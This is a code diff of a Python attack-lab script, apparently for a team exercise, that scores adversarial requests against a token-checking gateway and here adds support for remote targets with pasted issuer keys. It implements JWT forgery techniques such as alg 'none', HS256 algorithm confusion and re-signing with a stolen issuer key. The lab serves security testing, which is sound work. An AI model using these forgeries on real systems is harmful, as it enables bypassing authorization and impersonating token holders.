@@ -1,18 +1,25 @@
 """Attack lab for the local board.
 
 Fires adversarial requests at a gateway and scores what comes back against the Day 2
-rules in day_2_attack/ATTACK_SCORING.md. Two target modes:
+rules in day_2_attack/ATTACK_SCORING.md. A target is either our own deployment or a
+remote gateway described by a folder under day_2_attack/targets/<name>/.
 
 - own:  our own deployment. gateway/state holds the issuer key, so the lab can mint, forge
         and revoke any mandate, and signs with gateway/state/agent.pem. Every vector is available.
-- byo:  another team's gateway, from day_2_attack/targets/<team>/. The lab holds only the
-        mandate they gave us plus our own attack key (day_2_attack/attack.pem), so it signs with
-        that key and the mint/forge/revoke vectors that need our issuer are greyed out.
+- byo:  a remote gateway, from day_2_attack/targets/<name>/target.json ({"label","url"}). What
+        the lab can do depends on what you paste into that folder:
+          - default.jwt / feature.jwt — mandates you were issued, to attack as given.
+          - agent.pem — the holder key those mandates are bound to; requests are signed with it
+            (falls back to day_2_attack/attack.pem for mandates the lab minted itself).
+          - state/ — the remote gateway's state bundle (issuer_key.pem, status_list.json,
+            status_list.jwt, agent.pem). With it the lab mints, forges and revokes against the
+            remote, exactly as in own mode; without it those vectors are greyed out.
 
 Private keys stay on disk. Findings carry claims, the request body (the evidence a scored
 flag needs), decisions and leak analysis, never a private key. Headless:
 
     uv run python local_view/attacks.py --target own --url http://localhost:8082
+    uv run python local_view/attacks.py --target remote   # url comes from the target folder
     uv run python local_view/attacks.py --target own --group forged
 """
 
@@ -174,15 +181,15 @@ def _assemble(header: dict, claims: dict, sig: str) -> str:
     return f"{head}.{body}.{sig}"
 
 
-def _issuer_pub_pem() -> bytes | None:
-    doc = json.loads(_read(STATE / "trusted_list.json") or "{}")
+def _issuer_pub_pem(state: Path = STATE) -> bytes | None:
+    doc = json.loads(_read(state / "trusted_list.json") or "{}")
     for kid_map in doc.get("issuers", {}).values():
         for jwk in kid_map.values():
             return pub_to_pem(jwk_to_pub(jwk))
     return None
 
 
-def _forge_token(token: str, forge: dict) -> str:
+def _forge_token(token: str, forge: dict, state: Path = STATE) -> str:
     """Transform a mandate. op: keep-sig, none, random-issuer, issuer, hs256, swap-cnf."""
     op = forge.get("op", "keep-sig")
     header = {**_header(token), **(forge.get("header") or {})}
@@ -203,7 +210,7 @@ def _forge_token(token: str, forge: dict) -> str:
         return _assemble({**header, "alg": "none"}, claims, "")
     if op == "hs256":  # alg confusion: HMAC the token with the issuer public key as the secret
         # PyJWT refuses an asymmetric PEM as an HMAC key, so hand-roll the forgery the classic attack uses.
-        secret = _issuer_pub_pem() or b"public"
+        secret = _issuer_pub_pem(state) or b"public"
         head = b64u(json.dumps({"alg": "HS256", "typ": typ, "kid": kid}, separators=(",", ":")).encode())
         payload = b64u(json.dumps(claims, separators=(",", ":"), default=str).encode())
         signing_input = f"{head}.{payload}"
@@ -211,8 +218,8 @@ def _forge_token(token: str, forge: dict) -> str:
     if op == "random-issuer":  # a valid EdDSA signature from an issuer the gateway never trusted
         key: object = priv_to_pem(generate_keypair()[0])
         alg = "EdDSA"
-    elif op == "issuer":  # own only: our real issuer re-signs, to set nbf/exp or drop a claim validly
-        key = priv_to_pem(priv_from_pem((STATE / "issuer_key.pem").read_bytes()))
+    elif op == "issuer":  # re-sign with the target's real issuer key, to set nbf/exp or drop a claim validly
+        key = priv_to_pem(priv_from_pem((state / "issuer_key.pem").read_bytes()))
         alg = "EdDSA"
     else:
         return token
@@ -222,7 +229,7 @@ def _forge_token(token: str, forge: dict) -> str:
 # ---------------------------------------------------------------- mandates
 
 
-def _mint(spec: dict) -> tuple[str, int]:
+def _mint(spec: dict, state: Path = STATE) -> tuple[str, int]:
     extra: dict = {}
     if "clearance" in spec:
         extra["clearance"] = spec["clearance"]
@@ -231,8 +238,8 @@ def _mint(spec: dict) -> tuple[str, int]:
     extra.update(spec.get("extra") or {})
     with _ISSUE:
         return issue_mandate(
-            STATE,
-            load_agent_pub(STATE / "agent.pem"),
+            state,
+            load_agent_pub(state / "agent.pem"),
             scope=spec.get("scope", DEFAULT_SCOPE),
             deny=spec.get("deny", DEFAULT_DENY),
             ttl=spec.get("ttl", TTL),
@@ -253,27 +260,33 @@ def _reset_run_cache() -> None:
     _TOKEN_CACHE.clear()
 
 
-def _cached_mint(spec: dict) -> tuple[str, int | None]:
-    key = json.dumps(spec, sort_keys=True, default=str)
+def _cached_mint(spec: dict, state: Path = STATE) -> tuple[str, int | None]:
+    key = json.dumps([str(state), spec], sort_keys=True, default=str)
     cached = _TOKEN_CACHE.get(key)
     if cached is None:
-        cached = _mint(spec)
+        cached = _mint(spec, state)
         _TOKEN_CACHE[key] = cached
     return cached
 
 
 def _base_token(target: Target, base: str) -> str:
-    if target.mode == "byo":
+    # A byo target attacks the mandates it was given; only a target that can mint builds its own.
+    if target.mode == "byo" and not target.can_mint:
         tok = target.mandates.get(base, "")
         if not tok:
             msg = f"this target has no {base} mandate on disk"
             raise FileNotFoundError(msg)
         return tok
+    if base != "live" and target.mode == "byo":
+        tok = target.mandates.get(base, "")
+        if tok:
+            return tok  # prefer a mandate they issued us over minting our own, even when we can mint
+    state = target.state_dir or STATE
     if base == "live":
-        return _read(STATE / "mandate.jwt")
+        return _read(state / "mandate.jwt")
     if base == "feature":
-        return _cached_mint(_FEATURE_MINT)[0]
-    return _cached_mint(_DEFAULT_MINT)[0]
+        return _cached_mint(_FEATURE_MINT, state)[0]
+    return _cached_mint(_DEFAULT_MINT, state)[0]
 
 
 def _signing_key(target: Target):
@@ -288,33 +301,41 @@ def _needs_issuer(forge: dict) -> bool:
     return forge.get("op") in ("issuer", "hs256")
 
 
+_NEEDS_KEY = "needs the issuer key — own, or a byo target with a state/ bundle"
+
+
 def _resolve_mandate(target: Target, mandate: dict):
-    """Return (token, signing_priv). Raises PermissionError when a step needs our issuer on a byo target."""
+    """Return (token, signing_priv). Raises PermissionError when a step needs an issuer key we do not hold."""
+    state = target.state_dir or STATE
     revoke = bool(mandate.get("revoke"))
     idx: int | None = None
     if "raw" in mandate:
         token = mandate["raw"]
     elif mandate.get("mint") is not None:
         if not target.can_mint:
-            msg = "minting a mandate needs the issuer key (own target only)"
+            msg = f"minting a mandate {_NEEDS_KEY}"
             raise PermissionError(msg)
-        token, idx = _mint(mandate["mint"]) if revoke else _cached_mint(mandate["mint"])  # revoke needs a fresh idx
+        # revoke needs a fresh idx, so it skips the reuse cache
+        token, idx = _mint(mandate["mint"], state) if revoke else _cached_mint(mandate["mint"], state)
     else:
         token = _base_token(target, mandate.get("base", "default"))
     forge = mandate.get("forge")
     if forge:
         if _needs_issuer(forge) and not target.can_mint:
-            msg = f"the {forge.get('op')} forge needs the issuer key (own target only)"
+            msg = f"the {forge.get('op')} forge {_NEEDS_KEY}"
             raise PermissionError(msg)
-        token = _forge_token(token, forge)
+        token = _forge_token(token, forge, state)
     if revoke:
-        if not target.can_mint:
-            msg = "revoking a mandate needs the issuer key (own target only)"
+        # Revoking flips a bit in the status list the gateway re-reads each call. That only reaches the gateway
+        # when the lab writes the very state the gateway serves (own). A remote reads its own list and never sees
+        # our copy's flip, so a revoked-mandate test there would falsely "land" — refuse it instead.
+        if target.mode != "own":
+            msg = "revoking a mandate needs the live gateway state (own target only)"
             raise PermissionError(msg)
         if idx is None:  # a base or raw mandate: mint one we own so the revoked bit is this call's
-            token, idx = _mint(mandate.get("mint") or _DEFAULT_MINT)
+            token, idx = _mint(mandate.get("mint") or _DEFAULT_MINT, state)
         with _ISSUE:
-            revoke_mandate(STATE, idx)
+            revoke_mandate(state, idx)
     return token, _signing_key(target)
 
 
@@ -727,7 +748,10 @@ def run_vector(target: Target, vector: dict, http) -> dict:
 
 
 def _runnable(target: Target, vector: dict) -> bool:
-    return target.mode == "own" or not vector.get("needs_mint")
+    if vector.get("needs_mint") and not target.can_mint:
+        return False
+    # Revocation only reaches a gateway that serves the state we write, so it is an own-target test.
+    return target.mode == "own" or not (vector.get("mandate") or {}).get("revoke")
 
 
 def run_group(target: Target, group: str, http) -> list[dict]:
@@ -760,14 +784,20 @@ class Target:
     mode: str  # own | byo
     mandates: dict[str, str] = field(default_factory=dict)
     agent_key: Path = STATE / "agent.pem"
+    state_dir: Path | None = None  # own: gateway/state; byo: a pasted remote-state bundle, or None
 
     @property
     def can_mint(self) -> bool:
-        return self.mode == "own"
+        return self.state_dir is not None and (self.state_dir / "issuer_key.pem").is_file()
 
 
 def _own_ready() -> bool:
     return (STATE / "issuer_key.pem").is_file() and (STATE / "agent.pem").is_file()
+
+
+def _byo_state(folder: Path) -> Path | None:
+    bundle = folder / "state"
+    return bundle if (bundle / "issuer_key.pem").is_file() else None
 
 
 def targets() -> list[dict]:
@@ -780,17 +810,21 @@ def targets() -> list[dict]:
                 "mode": "own",
                 "url": "",
                 "mandates": ["default", "feature", "live"],
+                "can_mint": True,
             }
         )
     for cfg in sorted(TARGETS.glob("*/target.json")) if TARGETS.is_dir() else []:
+        folder = cfg.parent
         meta = json.loads(cfg.read_text())
+        mints = _byo_state(folder) is not None
         rows.append(
             {
-                "id": cfg.parent.name,
-                "label": meta.get("label", cfg.parent.name),
+                "id": folder.name,
+                "label": meta.get("label", folder.name),
                 "mode": "byo",
                 "url": meta.get("url", ""),
-                "mandates": [name for name in ("default", "feature") if (cfg.parent / f"{name}.jwt").is_file()],
+                "mandates": [name for name in ("default", "feature") if (folder / f"{name}.jwt").is_file()],
+                "can_mint": mints,
             }
         )
     return rows
@@ -798,15 +832,24 @@ def targets() -> list[dict]:
 
 def load_target(target_id: str, url: str | None = None) -> Target:
     if target_id == "own":
-        return Target("Our gateway (mint)", url or "", "own")
-    cfg = TARGETS / target_id / "target.json"
+        return Target("Our gateway (mint)", url or "", "own", state_dir=STATE)
+    folder = TARGETS / target_id
+    cfg = folder / "target.json"
     meta = json.loads(cfg.read_text()) if cfg.is_file() else {}
     mandates: dict[str, str] = {}
     for name in ("default", "feature"):
-        tok = _read(cfg.parent / f"{name}.jwt")
+        tok = _read(folder / f"{name}.jwt")
         if tok:
             mandates[name] = tok
-    return Target(meta.get("label", target_id), url or meta.get("url", ""), "byo", mandates, ATTACK_KEY)
+    state_dir = _byo_state(folder)
+    # Sign requests with, in order: a holder key pasted beside the mandate, the minting bundle's
+    # own holder key, else our attack key (which only matches mandates the lab minted itself).
+    agent_key = ATTACK_KEY
+    for candidate in (folder / "agent.pem", (state_dir / "agent.pem") if state_dir else None):
+        if candidate and candidate.is_file():
+            agent_key = candidate
+            break
+    return Target(meta.get("label", target_id), url or meta.get("url", ""), "byo", mandates, agent_key, state_dir)
 
 
 # ---------------------------------------------------------------- catalogue
